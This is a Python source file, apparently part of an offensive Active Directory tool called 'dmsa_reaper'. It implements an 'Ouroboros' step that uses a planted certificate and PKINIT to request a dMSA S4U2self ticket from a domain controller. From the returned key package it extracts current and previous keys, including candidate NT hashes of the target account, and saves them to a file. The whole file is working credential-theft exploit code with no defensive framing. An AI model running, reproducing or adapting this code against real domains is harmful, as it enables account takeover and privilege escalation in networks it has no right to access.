from __future__ import annotations

import asyncio
import json
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import quote, urlencode

from dmsa_reaper.models import Operation
from dmsa_reaper.ouroboros.credentials import secure_write_json


class OuroborosExtractionError(RuntimeError):
    pass


def _utc_now_iso() -> str:
    return (
        datetime.now(timezone.utc)
        .replace(microsecond=0)
        .isoformat()
        .replace("+00:00", "Z")
    )


def _require_artifacts(operation: Operation) -> tuple[Path, str]:
    metadata = operation.metadata.get("ouroboros")
    if not isinstance(metadata, dict):
        raise OuroborosExtractionError("operation has no Ouroboros artifact metadata")
    pfx_path = Path(str(metadata.get("pfx_path") or ""))
    manifest_path = Path(str(metadata.get("credential_manifest") or ""))
    if not pfx_path.is_file():
        raise OuroborosExtractionError(f"Ouroboros PFX is missing: {pfx_path}")
    if not manifest_path.is_file():
        raise OuroborosExtractionError(
            f"Ouroboros credential manifest is missing: {manifest_path}"
        )
    try:
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    except Exception as exc:
        raise OuroborosExtractionError(
            f"cannot read Ouroboros credential manifest: {exc}"
        ) from exc
    password = manifest.get("pfx_password")
    if not isinstance(password, str) or not password:
        raise OuroborosExtractionError("credential manifest has no PFX password")
    return pfx_path.resolve(), password


def _endpoint(value: str) -> str:
    endpoint = value.strip()
    if not endpoint or any(char in endpoint for char in "/?#@"):
        raise OuroborosExtractionError(f"invalid KDC endpoint: {value!r}")
    if ":" in endpoint and not endpoint.startswith("["):
        return f"[{endpoint}]"
    return endpoint


def _key_record(key: dict[str, Any]) -> dict[str, Any]:
    from kerbad.protocol.encryption import Enctype

    key_type = int(key["keytype"])
    key_value = bytes(key["keyvalue"])
    return {
        "enctype": Enctype.get_name(key_type),
        "keytype": key_type,
        "value": key_value.hex(),
    }


async def _request_key_package(
    *,
    domain: str,
    dmsa_sam: str,
    dc: str,
    pfx_path: Path,
    pfx_password: str,
) -> dict[str, Any]:
    try:
        from kerbad.common.factory import KerberosClientFactory
        from kerbad.common.spn import KerberosSPN
        from kerbad.protocol.external.ticketutil import get_KRBKeys_From_TGSRep
    except ImportError as exc:
        raise OuroborosExtractionError(
            "kerbad is required for Ouroboros extraction; reinstall dmsa-reaper"
        ) from exc

    realm = domain.upper()
    identity = quote(f"{domain}\\{dmsa_sam}", safe="")
    password = quote(pfx_password, safe="")
    query = urlencode({"certdata": str(pfx_path), "timeout": 120})
    kerberos_url = (
        f"kerberos+pfx://{identity}:{password}@{_endpoint(dc)}/?{query}"
    )
    try:
        factory = KerberosClientFactory.from_url(kerberos_url)
        client = factory.get_client()
        service_spn = KerberosSPN.from_spn(
            f"krbtgt/{realm}@{realm}",
            default_realm=realm,
        )
        dmsa_principal = KerberosSPN.from_upn(
            f"{dmsa_sam}@{realm}",
            default_realm=realm,
        )
        await client.with_clock_skew(client.get_TGT)
        _, encrypted_reply, _ = await client.with_clock_skew(
            client.S4U2self,
            dmsa_principal,
            service_spn,
            is_dmsa=True,
        )
        package = get_KRBKeys_From_TGSRep(encrypted_reply)
    except Exception as exc:
        raise OuroborosExtractionError(
            f"PKINIT/dMSA S4U2Self extraction failed: {exc}"
        ) from exc
    if not package:
        raise OuroborosExtractionError(
            "KDC response did not contain KERB-DMSA-KEY-PACKAGE"
        )
    return package


def extract_ouroboros_credentials(
    operation: Operation,
    *,
    domain: str | None = None,
    dc: str | None = None,
) -> dict[str, Any]:
    """Use the planted certificate and self-enrollment to retrieve dMSA keys."""
    if operation.primitive != "ouroboros":
        raise OuroborosExtractionError("operation is not an Ouroboros operation")
    if operation.status != "executed" or operation.cleaned_up:
        raise OuroborosExtractionError(
            "extraction requires an active, successfully executed Ouroboros operation"
        )
    pfx_path, password = _require_artifacts(operation)
    effective_domain = str(domain or operation.metadata.get("domain") or "")
    effective_dc = str(
        dc
        or operation.metadata.get("dc_ip")
        or operation.metadata.get("dc_host")
        or ""
    )
    dmsa_sam = str(operation.metadata.get("created_dmsa_sam") or "")
    if not effective_domain:
        raise OuroborosExtractionError("operation has no domain; pass --domain")
    if not effective_dc:
        raise OuroborosExtractionError("operation has no KDC endpoint; pass --dc-ip")
    if not dmsa_sam:
        raise OuroborosExtractionError("operation has no created dMSA account name")

    package = asyncio.run(
        _request_key_package(
            domain=effective_domain,
            dmsa_sam=dmsa_sam,
            dc=effective_dc,
            pfx_path=pfx_path,
            pfx_password=password,
        )
    )
    current = [_key_record(key) for key in package.get("current-keys", [])]
    previous = [_key_record(key) for key in package.get("previous-keys", [])]
    if not current and not previous:
        raise OuroborosExtractionError("dMSA key package contains no keys")
    result = {
        "status": "extracted",
        "extracted_at": _utc_now_iso(),
        "operation_id": operation.id,
        "dmsa_sam": dmsa_sam,
        "target_dn": operation.metadata.get("target_dn"),
        "current_keys": current,
        "previous_keys": previous,
        "candidate_target_nt_hashes": [
            key["value"]
            for key in previous
            if key["keytype"] == 23 and len(key["value"]) == 32
        ],
    }
    ouroboros_meta = operation.metadata.get("ouroboros") or {}
    run_dir = Path(str(ouroboros_meta.get("run_dir") or pfx_path.parent))
    output_path = run_dir / (
        f"extraction-{datetime.now(timezone.utc):%Y%m%dT%H%M%S%fZ}.json"
    )
    secure_write_json(output_path, result)
    result["artifact"] = str(output_path)
    return result
